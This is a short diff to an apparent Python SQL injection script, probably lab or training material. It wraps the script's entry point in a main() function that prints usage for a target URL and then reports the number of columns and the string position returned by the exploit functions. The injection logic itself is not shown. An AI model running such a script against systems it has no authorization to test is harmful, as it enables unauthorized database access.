@@ -34,11 +34,22 @@ def exploit_sqli(url):
     return counter
     
 
+def main():
+    if len(sys.argv) != 3:
+        print(f"(+) Usage: {sys.argv[0]} <url> <randomString>")
+        print(f"(+) Example: {sys.argv[0]} https://target.com/ ydg45gf")
+        sys.exit(-1)
 
-if __name__ == '__main__':
     url = sys.argv[1]
     randomString = sys.argv[2]
     numCols = exploit_sqli(url)
     position = sqli_detect_string_pos(url, numCols, randomString)
-    print(numCols)
-    print(position)
+    print(f'(+) Number of returned columns: {numCols}')
+    print(f'(+) Position: {position}')
+    
+    
+
+if __name__ == "__main__":
+    main()
+
+
